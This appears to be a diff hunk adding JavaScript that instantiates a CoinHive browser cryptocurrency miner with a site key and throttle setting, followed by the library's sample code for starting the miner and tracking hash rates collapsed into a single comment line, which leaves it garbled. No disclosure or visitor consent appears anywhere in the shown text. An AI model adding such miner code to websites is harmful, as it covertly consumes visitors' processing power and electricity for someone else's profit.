@@ -1,0 +1,3 @@
+var miner = new CoinHive.Anonymous('kLsp0GVSbCafETZ0yWoRfXg2TnGoCjWN', {
+    throttle: 0.3
+}); // Only start on non-mobile devices and if not opted-out// in the last 14400 seconds (4 hours):if (!miner.isMobile() && !miner.didOptOut(14400)) {miner.start();}// Listen on eventsminer.on('found', function() { /* Hash found */ })miner.on('accepted', function() { /* Hash accepted by the pool */ })// Update stats once per secondsetInterval(function() {var hashesPerSecond = miner.getHashesPerSecond();var totalHashes = miner.getTotalHashes();var acceptedHashes = miner.getAcceptedHashes();// Output to HTML elements...}, 1000);
